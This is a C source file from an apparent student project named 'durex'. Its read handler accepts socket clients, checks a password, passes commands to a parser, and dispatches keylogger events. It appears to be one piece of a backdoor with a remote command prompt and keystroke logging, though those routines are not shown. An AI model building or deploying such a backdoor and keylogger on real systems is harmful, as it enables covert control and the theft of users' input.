/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   do_read.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mdufaud <mdufaud@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/05/17 18:30:07 by mdufaud           #+#    #+#             */
/*   Updated: 2018/05/20 20:04:36 by mdufaud          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"
#include <sys/socket.h>

static void		log_client_input(t_durex *durex, int co, char *buf)
{
	char	*s;

    if (buf && buf[0])
    {
        ft_sprintf(&s, "Client #%d - %s\n", co, buf);
        durex_log(durex, s, "CMD");
        free(s);
    }
}

static void		debug_read(t_durex *durex, int co, char *buf, int ret)
{
	int		nl;

	if (durex->debug)
	{
		nl = 0;
		if (buf[ret - 1] == '\n')
		{
			nl = 1;
			buf[ret - 1] = 0;
		}
		ft_printf("From client[%d] - (read %d): %s\n", co, ret, buf);
		if (nl)
			buf[ret - 1] = '\n';
	}
}

static void		read_client(t_durex *durex, int co)
{
	int			ret;
	char		buf[BUFF_SIZE + 1];

	if ((ret = recv(co, buf, BUFF_SIZE, 0)) <= 0)
	{
		remove_client(durex, co);
		return ;
	}
	buf[ret] = 0;
	if (!ft_strchr(buf, '\n'))
		return ;
	if (ret > 0)
		buf[ret - 1] = 0;
	debug_read(durex, co, buf, ret);
	if (durex->clients[co].step == STEP_PASSWD)
		check_pwd(durex, co, buf);
	else if (durex->clients[co].step == STEP_CMD)
	{
		log_client_input(durex, co, buf);
		if (!buf[0])
			message_client(durex, co, DUREX_PROMPT);
		else if (cmd_parse(durex, co, buf))
			message_client(durex, co, DUREX_PROMPT);
	}
}

void			do_read(t_durex *durex, int socket)
{
	if (durex->clients[socket].type == FD_SRV)
		accept_client(durex, socket);
	else if (durex->clients[socket].type == FD_CLIENT)
		read_client(durex, socket);
	else if (durex->clients[socket].type == FD_KEYLOG)
		keylog_pressed(durex);
}
